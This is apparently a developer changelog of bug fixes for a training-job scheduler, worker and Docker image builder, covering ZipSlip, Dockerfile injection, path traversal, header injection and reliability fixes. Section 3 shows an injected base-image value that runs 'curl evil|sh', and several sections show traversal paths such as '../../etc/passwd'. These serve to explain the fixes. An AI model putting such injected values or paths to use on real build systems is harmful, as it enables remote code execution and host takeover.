# Bug Fixes

All existing tests pass after fixes: `Scheduler` 198 passed, `Worker` 224 passed, `Docker_Image_Builder` 99 passed.
Three tests that codified buggy behaviour were updated (see §13); interactive-access tests were removed entirely with the feature (see §18).

---

## 1. `Docker_Image_Builder/builder.py` — ZipSlip RCE in `extract_job_archive`

**Bug:** `zip_ref.extractall(extract_dir)` with no validation. A zip entry like `../../etc/cron.d/x` or `/tmp/x` writes outside `extract_dir`. Builder has docker socket mounted → host root takeover.

**Fix:** Manual safe extraction: reject absolute/drive-letter paths, `realpath(join(base,name))` must stay under `base`, create dirs explicitly, `copyfileobj` contents. Added `_sanitize_job_id()` (`[^a-zA-Z0-9_-]→_`, 64-char cap) for `tempfile.mkdtemp(prefix=f"job_{job_id}_")` — a `job_id` with `/` caused `FileNotFoundError`/DoS. (The former `interactive_{job_id}_` temp prefix was removed with the interactive feature, see §18.)

**Why:** Standard ZipSlip defence; unsanitized `job_id` is also used as Docker tag / object-key prefix / URL path, so it must be charset-constrained at creation.

## 2. `Docker_Image_Builder/builder.py` — `find_project_dir` drops root files

**Bug:** Returned alphabetically-first subdir unconditionally. Layout `requirements.txt` at root + `src/` dir → returned `src/`, root `requirements.txt` lost → broken `pip install`.

**Fix:** Prefer (1) root if it has `requirements.txt` or any `*.py`, (2) subdir containing `requirements.txt`, (3) fallback to old alphabetical-first behaviour (keeps existing tests green).

**Why:** Build must include dependency manifest; heuristic must be content-aware, not alphabetical.

## 3. `Docker_Image_Builder/docker_ops.py` — `generate_dockerfile` injection + `isdir` bug

**Bug:** `f"FROM {base_image}"` and `f"CMD {command}"` with no newline check — `base_image="python:3.11\nRUN curl evil|sh"` injects arbitrary root build steps. `os.path.exists(requirements.txt)` is true for a directory named `requirements.txt` → broken `pip install`.

**Fix:** Reject `\n`/`\r`/empty `base_image`, reject multi-line `command`; use `os.path.isfile` for requirements check.

**Why:** User controls both fields (job submission); Dockerfile injection = host compromise via docker socket.

## 4. `Docker_Image_Builder/docker_ops.py` — `save_debug_copy` traversal + `0777`

**Bug:** `os.path.join(DEBUG_LOCAL_DIR, job_id)` with raw `job_id="../../etc"` escapes; `chmod 0777/0666` world-writable; copies `.env`/secrets persistently, never cleaned.

**Fix:** Sanitize `job_id` to `[^a-zA-Z0-9_-]`, removed world-writable chmod (keep default restrictive perms).

**Why:** Prevents local tampering/secret leak and path escape.

## 5. `Docker_Image_Builder/docker_ops.py` — `upload_build_logs` lied about success

**Bug:** `except: log warning; return object_key` always. `maybe_upload_build_logs` then set `last_upload_time=now` even when upload failed → logs considered persisted when lost; throttling suppressed retries for 60s.

**Fix:** `upload_build_logs() -> str | None` (sanitized `job_id`, `None` on failure); `maybe_upload_build_logs` only advances timestamp on success (returns old timestamp on failure).

**Why:** Caller must distinguish success/failure to retry; otherwise build logs silently lost.

## 6. `Docker_Image_Builder/docker_ops.py` — `build_push_and_clean` bookkeeping

**Bug:** `update_base_image_usage(base_image)` ran *before* build → failed/injected bases marked fresh, LRU polluted, prevents pruning. `build_{job_id}_` prefix unsanitized. `_extract_build_log_lines` did `strip()` destroying traceback indentation.

**Fix:** Sanitize `build_dir` prefix; move `update_base_image_usage` to after successful push (try/except); preserve leading indent via `strip("\r\n").rstrip()` + `if line.strip()`.

**Why:** LRU must reflect usable images only; indentation matters for Python tracebacks.

## 7. `Worker/hardware.py` — empty `worker_id.txt` + unguarded `get_gpu_info`

**Bug:** `f.read().strip()` returning `""` was returned as worker id → registers as `""`, collides with all empty-id workers. `get_gpu_info()` was the only hardware fn without `try` — `GPUtil.getGPUs()` raising (no NVML) crashed `/api/worker`, `/api/metrics`.

**Fix:** Return existing only if truthy, else generate+mkdir+persist new UUID (OSError-tolerant); wrap `getGPUs()` in try/except → `("Unknown",0,0,0,0)`.

**Why:** Empty IDs break registry uniqueness; metrics endpoints must never 500 on GPU-less hosts.

## 8. `Worker/io_monitor.py` — `None` counters + `dt≈0` spike

**Bug:** `psutil.disk_io_counters()` can return `None` (minimal containers) → `disk.read_bytes` → `AttributeError` → `/api/metrics` 500. `now == prev_time` exact check misses `dt=1e-9` → GB/s spike.

**Fix:** Return zeros if `disk is None or net is None`; replace equality with `dt < 1e-6` guard; wrap rate math in `AttributeError` fallback.

**Why:** Monitor must be total-failure-safe; clock adjustments must not produce bogus rates.

## 9. `Worker/object_store.py` — `_post_retry` reuses consumed file handle

**Bug:** Looped `requests.post(..., files={"file": f})` with same `f`. After first attempt reads `f` to EOF, retries send empty body without `seek(0)` → 0-byte object stored as success.

**Fix:** Added `_rewind_files()` — `seek(0)` every file-like in `files` dict before each attempt.

**Why:** Standard retry bug; without rewind, transient failure → permanent data loss.

## 10. `Worker/server.py` — `ws_metrics` always crashed + empty URL bricks restart

**Bug A:** `"gpus": [_dump(g) for g in get_gpus()]` called the FastAPI route `get_gpus()` (returns `list[dict]`), then `_dump(dict)` does `dict.dict` → `AttributeError` → socket dies on first tick.
**Fix A:** `"gpus": get_gpus_info()` directly.

**Bug B:** `PUT /api/config {"schedulerUrl":"   "}` → `new_url=""` differs from current, so `persist_env({"SCHEDULER_URL":""})` writes empty to `.env` → next restart `config.py` raises `ValueError`, worker bricked.
**Fix B:** Reject empty after `strip().rstrip("/")` with `400`.

**Why:** (A) route fns are not data helpers; (B) persistent config must be validated before writing.

## 11. `Worker/api.py` — unquoted `job_id` + raw `KeyError`

**Bug:** `f"{_url('/jobs/logs')}/{job_id}"` without quoting — `/` in `job_id` splits route. `save_vram_estimation` did `report[...]` direct indexing → raw `KeyError` with no context, and `step_wall_time=None` passed through.

**Fix:** `quote(str(job_id), safe="")`; validate `peak_reserved_memory/peak_ram_memory/step_wall_time` presence, raise `ValueError` with report context, reject `None` step time.

**Why:** URL injection + unclear errors; validation gives actionable logs.

## 12. `Worker/executor.py` — `docker_client`, cleanup, `process_job`

**Bug A:** `__init__` left `self.docker_client` unset on `from_env()` failure → later `pull_docker_image` raises `AttributeError` (only accidentally swallowed).
**Fix A:** Always set `self.docker_client=None` first.

**Bug B:** `_remove_output_dir` fallback `docker run -v host:/cleanup alpine rm -rf /cleanup` tries to unlink the bind mountpoint itself (often `EBUSY`) → returns `False` even after success, keeps dir.
**Fix B:** `sh -c "rm -rf /cleanup/* /cleanup/.[!.]* ...; true"` (delete contents) + `shutil.rmtree` afterwards.

**Bug C:** `process_job` with `job_id=None` → `image=None:latest`; `job_id="../evil"` → `OUTPUT_DIR` escape; unknown `flag` only warned → scheduler job stuck `IN_PROGRESS` forever.
**Fix C:** Return early on missing id; reject `/,\,..` in id (mark failed); unknown flag now `mark_job_failed(system)` so watchdog can requeue.

**Why:** (A) explicit None is fail-clear; (B) mountpoint semantics; (C) traversal + stall prevention.

## 13. Test updates (tests codified bugs)

- `Docker_Image_Builder/tests/test_docker_ops.py::test_failure_still_returns_key`: now asserts `is None` (was `== "j1/build.log"`).
- `Worker/tests/test_api.py::test_missing_key_raises`: now `pytest.raises((KeyError, ValueError))` (was `KeyError` only) — implementation raises `ValueError` with context.
- `Worker/tests/test_executor.py::test_docker_failure_leaves_no_client`: now asserts `ex.docker_client is None` (was `not hasattr`).
- Interactive-access tests removed with the feature (see §18), not just updated:
  - `Docker_Image_Builder/tests/test_api.py`: 4 `test_interactive_*` cases in `TestNotifyReady`.
  - `Docker_Image_Builder/tests/test_config.py`: `SCHEDULER_INTERACTIVE_UPDATE_URL` assertion.
  - `Docker_Image_Builder/tests/test_builder.py`: `iready` mock, `build_type`/`base_job_id` in `_training_job` helper, malformed-`interactive` payload entry, `test_already_processed_renotifies_interactive`, `test_interactive_success`.
  - `Docker_Image_Builder/tests/test_docker_ops.py`: `TestInteractiveDockerfile` (2 tests), `test_interactive_success_uses_interactive_tag`, `test_interactive_build_error_is_system_failure`.
  - `Scheduler/tests/test_job_service.py`: `TestInteractiveJobs` (6 tests), `build_type` assertion in `TestGetNotRunnableJobs`, unused `MagicMock` import.
  - `Scheduler/tests/test_schemas.py`: `INTERACTIVE_READY` enum member, `test_interactive_requests`, unused `Interactive*` imports.
  - `Scheduler/tests/test_api_routes.py`: `test_submit_interactive`, `test_submit_interactive_bad_base`, `test_mark_interactive_ready_route`, unused `JobPriority` import.

## 14. `Scheduler/app/api/jobs_route.py` — path traversal in `upload_output` / `get_output_by_id`

**Bug:** `os.path.join(output_dir, file.filename)` with raw `file.filename` (`../../` → escape); `job_id=os.path.splitext(file.filename)[0]` unsanitized; `get_output_by_id` did `join(output_dir, f"{job_id}.txt")` with raw `job_id` → arbitrary read (`../../etc/passwd.txt`).

**Fix:** `basename` + `realpath` + `commonpath` confinement for both; validate derived `job_id` (`/,\\,..` rejected); return `{"error":...}` on invalid.

**Why:** Filenames/job IDs are attacker-controlled; must stay inside `Scheduler/output`.

## 15. `Scheduler/app/utils/auth.py` — deprecated naive `utcnow`

**Bug:** `datetime.utcnow()` deprecated, returns naive datetime for `exp` claim.
**Fix:** `datetime.now(timezone.utc)`.
## 16. `Scheduler/app/services/log_service.py` — `TERMINAL_STATUSES` incomplete

**Bug:** `{"COMPLETED","FAILED"}` omitted `RETRY_NEEDED` → WS `/{job_id}/logs/stream` never sends `done`/closes on stall, hangs holding a DB session.

**Fix:** `{"COMPLETED","FAILED","RETRY_NEEDED"}` matching `job_service.TERMINAL_STATUSES`. (`INTERACTIVE_READY` was briefly part of this set while the interactive feature existed; it was removed with the feature, see §18 — current set is the 3 training-lifecycle terminals.)
## 17. `Object_store/main.py` — header injection + `expires` + MIME

**Bug:** `Content-Disposition: filename="{object_key.split('/')[-1]}"` with quotes/CRLF → response splitting. `expires: int = Form(3600)` unvalidated — negative/huge → `OverflowError` 500 or permanent URL. `media_type="application/zip"` hardcoded even for `build.log` (text).

**Fix:** Strip `[\r\n"]`, cap 200 chars, add `filename*=UTF-8''{quoted}`; validate `1 <= expires <= 604800` → 400 otherwise; `media_type="application/octet-stream"`.

**Why:** Object keys are user-influenced; S3 caps presigned URLs at 7 days; correct MIME avoids browser mishandling.

## 18. Interactive access removed completely

**Scope:** The SSH-over-Tailscale/Headscale interactive sandbox feature (training-derived images with overridden entrypoint, `*-interactive` tags, gateway/whitelist plumbing) was deleted. No `interactive`/`INTERACTIVE`/`Tailscale`/`Headscale` references remain in `Scheduler/app`, `Docker_Image_Builder`, or `Worker` source, tests, or env files; stale `__pycache__` (`interactive_handler`, `interactive_route/session/schema/service`, `ephemeral_password`, whitelist trackers) was deleted.

**Removed:**
- `Scheduler/app/models/job_model.py`: `JobStatus.INTERACTIVE_READY`, `build_type` / `base_job_id` columns.
- `Scheduler/app/schemas/job_schema.py`: `InteractiveBuildRequest`, `InteractiveReadyRequest`.
- `Scheduler/app/services/job_service.py`: `create_interactive_job()`, `mark_interactive_ready()` (+ unused `uuid` import); `build_type`/`base_job_id` dropped from `get_not_runnable_jobs()`.
- `Scheduler/app/api/jobs_route.py`: `POST /submit_interactive`, `POST /mark_interactive_ready`.
- `Scheduler/app/db/database.py`: `build_type` / `base_job_id` migration statements.
- `Scheduler/app/services/log_service.py`: `INTERACTIVE_READY` dropped from `TERMINAL_STATUSES` (now 3 members, matching `job_service.TERMINAL_STATUSES`).
- `Docker_Image_Builder/config.py`: `SCHEDULER_INTERACTIVE_UPDATE_URL`.
- `Docker_Image_Builder/api.py`: `notify_scheduler_interactive_ready()`.
- `Docker_Image_Builder/builder.py`: `build_type`/`base_job_id` payload handling, interactive tempdir + `build_type="interactive"` branch (training-only: validate `id`/`object_key`/`docker_base_image` → download → extract → `build_push_and_clean` → `notify_scheduler_job_ready`).
- `Docker_Image_Builder/docker_ops.py`: `generate_interactive_dockerfile()`, `generate_interactive_entrypoint()`; `build_type` param/branches removed from `build_push_and_clean()` (single `{USER}/{job_id}:latest` tag, single training header, `BuildError` → `user`).
- `Scheduler/.env`: Headscale/gateway/OCI/whitelist block; `Worker/.env`: `INTERACTIVE_*` timeouts.
- Tests: all cases listed in the fourth bullet of §13.

**Why:** Single training-only path — no second image type, tag scheme, builder branch, scheduler route, or terminal state to maintain; existing DBs keep the dropped columns harmlessly unused.

## 19. `Worker/executor.py` — redundant-code cleanup (no behaviour change)

**Cleanup (safe dedupe only):**
- Added `_reset_log_state()` — the 5-line per-run init (`_build_log_base`, `_last_log_upload`, `_log_push_buffer`, `_last_log_push`, `_job_log_buffer`) was duplicated in `handle_training()` and `_resume_attempt()`; both call sites now use the helper.
- Added `_throttled(last, interval, force)` — the throttle guard was duplicated in `_flush_log_push()` and `_append_build_log()`; both now delegate to it.
- `_resolve_mount_target()`: `if workdir in ("", "/")` → `if workdir == "/"` — the `""` arm was dead because `self._image_workdir(...) or "/workspace"` already eliminates falsy values; docstring updated accordingly.

**Why:** Duplicated throttle/init blocks drift independently; single helpers keep the 60s upload / 1s push intervals and resume semantics in one place.
